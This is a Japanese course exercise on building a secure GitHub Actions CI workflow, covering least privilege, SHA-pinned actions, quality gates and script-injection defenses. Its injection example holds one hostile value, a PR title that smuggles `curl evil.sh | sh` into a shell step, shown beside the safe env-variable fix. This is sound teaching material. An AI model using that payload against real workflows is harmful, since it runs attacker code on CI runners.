# 課題12: CI/CD(GitHub Actions)

**週12** / 実装場所: `starter/ci/ci.yml`

## 1. 課題の目的

自分の手で、**品質ゲート**として機能する GitHub Actions のワークフローを書く。
「動くCI」ではなく、**安全で、運用できるCI**(最小権限・SHA固定・インジェクション対策・何で失敗させるかの設計)を作る。

## 2. 学習する概念

GitHub Actions(トリガー・ジョブ・ステップ・`permissions`・`concurrency`・キャッシュ)/ **最小権限** / **サプライチェーン攻撃とSHA固定** / スクリプトインジェクション / `pull_request` と `pull_request_target` の違い / 品質ゲート(何で失敗させるか)/ 必須ステータスチェック

## 3. 背景知識

### ワークフローの骨格

```yaml
name: CI
on: { pull_request, push: { branches: [main] } }
permissions: {} # ← 既定は権限なし。必要な job にだけ付ける
jobs:
  quality:
    runs-on: ubuntu-24.04
    timeout-minutes: 15
    permissions: { contents: read }
    steps:
      - uses: actions/checkout@<40桁のSHA> # v7.0.1
        with: { persist-credentials: false }
      - uses: actions/setup-node@<SHA> # vX.Y.Z
        with: { node-version-file: .nvmrc, cache: npm }
      - run: npm ci --ignore-scripts
      - run: npm run lint
```

### 守るべきルール([security-design.md](../security-design.md#3-github-actions-のセキュリティ))

| ルール                                                                                                    | 理由                                                      |
| --------------------------------------------------------------------------------------------------------- | --------------------------------------------------------- |
| トップレベル `permissions` を明示し、`write` を入れない。必要な job にだけ最小限を付ける                  | トークンが悪用されたときの被害を限定                      |
| Action は**コミットSHA(40桁)で固定**。コメントにバージョンを書く                                          | タグは付け替えられる。SHAは改ざんできない                 |
| `pull_request_target` / `workflow_run` を使わない                                                         | fork の信頼できないコードに、書き込み権限・秘密を渡さない |
| `run:` に `${{ github.event.* }}` / `github.head_ref` / `secrets.*` を**直接埋め込まない**。`env:` 経由で | シェルインジェクション                                    |
| `actions/checkout` は `persist-credentials: false`                                                        | トークンを `.git` に残さない                              |
| 全 job に `timeout-minutes`                                                                               | 暴走・課金対策                                            |
| self-hosted ランナーを使わない(public リポジトリ)                                                         | 誰でもPRでランナー上のコードを実行できる                  |

**インジェクションの例(やってはいけない)**

```yaml
- run: echo "PR title: ${{ github.event.pull_request.title }}"      # ✗ タイトルが `"; curl evil.sh | sh; "` だったら…
- env: { TITLE: "${{ github.event.pull_request.title }}" }
  run: echo "PR title: $TITLE"                                       # ✓ 環境変数として渡す(シェルは値を「文字列」として扱う)
```

### SHA の調べ方

```bash
gh api repos/actions/checkout/releases/latest --jq .tag_name
gh api repos/actions/checkout/git/ref/tags/<タグ> --jq '.object.type+" "+.object.sha'
# type が "tag"(注釈付きタグ)なら: gh api repos/actions/checkout/git/tags/<sha> --jq .object.sha  ← これがコミットSHA
```

**自分で調べた最新のSHAを使う**(この教材のSHAは、時間が経つと古くなる)。更新は Dependabot(`github-actions`)に任せる。

### 品質ゲートの設計

何で PR を失敗させるか(**すべての警告を失敗にしない**)は [ADR-0014](../adr/0014-ci-quality-gates.md)。
失敗にする: 型エラー / lint エラー / フォーマット差分 / テスト失敗 / 本番依存の High 以上の脆弱性。
失敗にしない(参考情報): 開発依存の Moderate、ライセンスの警告(など)。

## 4. 実装する機能

`starter/ci/ci.yml`(雛形がある)を完成させる。

### 必須

- トリガー: `pull_request` と `main` への `push`
- トップレベル `permissions`(write なし)、job ごとの `permissions: contents: read`
- 全 job に `timeout-minutes`
- 公式 Action を **SHA で固定**(`actions/checkout`、`actions/setup-node`)。`persist-credentials: false`
- ステップ(順序は考える): `npm ci`(`--ignore-scripts` つき)→ **lint** → **フォーマット検査** → **型検査** → **テスト** → **`npm audit`(本番依存の High 以上で失敗)**
- Node のバージョンは `.nvmrc` から(`node-version-file`)

### 発展(余裕があれば)

- `concurrency` で、同じブランチの古い実行をキャンセル
- 開発依存を含む `npm audit` を、**失敗させずに**ジョブサマリに表示(`continue-on-error` と `$GITHUB_STEP_SUMMARY`)
- CodeQL / Dependency Review のワークフロー(`reference` の `.github/workflows/` と見比べる)

## 5. 実装対象ファイル

`starter/ci/ci.yml`(雛形に `TODO(ex12)`)。完成したら、自分のリポジトリの `.github/workflows/` にコピーして**実際に動かす**(次の「テスト方法」)。

## 6. 受け入れ条件

- [ ] `npm run exercise -- 12` が合格(次のルールを機械的に検査: `permissions`・SHA固定・危険なトリガー無し・インジェクション無し・checkout の `persist-credentials`・`timeout-minutes`・self-hosted 無し・`npm ci` / lint / フォーマット / 型検査 / テスト / `npm audit` の各ステップがある)
- [ ] 自分のリポジトリで、PRに対して**実際に実行され、緑になる**
- [ ] **わざと**失敗させて(lintエラー、テスト失敗)、PRが「失敗」と表示され、**必須チェックならマージできなくなる**ことを確認した(→ [github-settings.md](../github-settings.md) の Ruleset)
- [ ] 使っている Action のバージョンと SHA の対応を、自分で説明できる

## 7. テスト方法

```bash
npm run exercise -- 12                # starter/ci/*.yml を検査(scripts/check-workflows.mjs)
node scripts/check-workflows.mjs starter/ci --require-quality-steps    # 同じ(直接実行)
node scripts/check-workflows.mjs                                       # このリポジトリの .github/workflows を検査

# 実際に動かす(自分のリポジトリで)
mkdir -p .github/workflows && cp starter/ci/ci.yml .github/workflows/learner-ci.yml
git switch -c feature/ex12-ci && git add .github && git commit -m "ci: 自作ワークフロー" && git push -u origin HEAD
gh pr create --fill && gh pr checks --watch
```

(`.github/workflows/learner-ci.yml` は、学習用のコピーです。`main` に入れるかは自分で決める)

## 8. 段階的なヒント

<details><summary>ヒント1: 雛形のどこが危険か</summary>

雛形の `uses: actions/checkout@v4` はタグ指定。`permissions` が無い。`timeout-minutes` が無い。**検査コマンドを実行すると、何が違反か**が一覧で出る。1つずつ直す。

</details>

<details><summary>ヒント2: 品質ステップ</summary>

このリポジトリの `package.json` の `scripts` に、`lint` `format:check` `typecheck` `test` `audit` がある。`run: npm run <名前>`。
`npm audit --omit=dev --audit-level=high` が、本番依存の High 以上だけで失敗するコマンド。

</details>

<details><summary>ヒント3: SHA 固定と読みやすさ</summary>

`uses: actions/checkout@3d3c...b1 # v7.0.1` のように、**SHA の後ろにコメントでバージョン**を書くと、読む人と Dependabot にやさしい。
SHA は自分で `gh api` で調べる。**貼り間違えると** `Unable to resolve action` で失敗するので、PRで実際に動かして確認する。

</details>

## 9. 発展課題

1. CodeQL ワークフローを書く(`security-events: write` を、**その job だけ**に付ける理由を説明する)
2. `workflow_dispatch` に入力(`inputs`)を付けて、そのまま `run:` に使うと何が起きるか(インジェクション)を、安全な環境で試す
3. 依存のキャッシュ(`actions/setup-node` の `cache: npm`)が、`package-lock.json` のどの変化で無効になるか調べる
4. `actions/dependency-review-action` を追加して、脆弱な依存を含む PR が止まることを確認する(確認後、PRは閉じる)

## 10. 完了後に理解しておくべきこと

- CIは「ビルドとテストを自動化する」だけでなく、**攻撃面**でもある(権限・外部Action・外部入力)
- **最小権限**と**SHA固定**の理由(サプライチェーン攻撃)
- `pull_request` と `pull_request_target` の違い(fork のコードにどんな権限を与えるか)
- 何で失敗させるかの設計 = **運用できる**品質ゲート(誤検知で止まり続けると、無視される)
- 必須ステータスチェックを設定して、はじめて「ゲート」になる
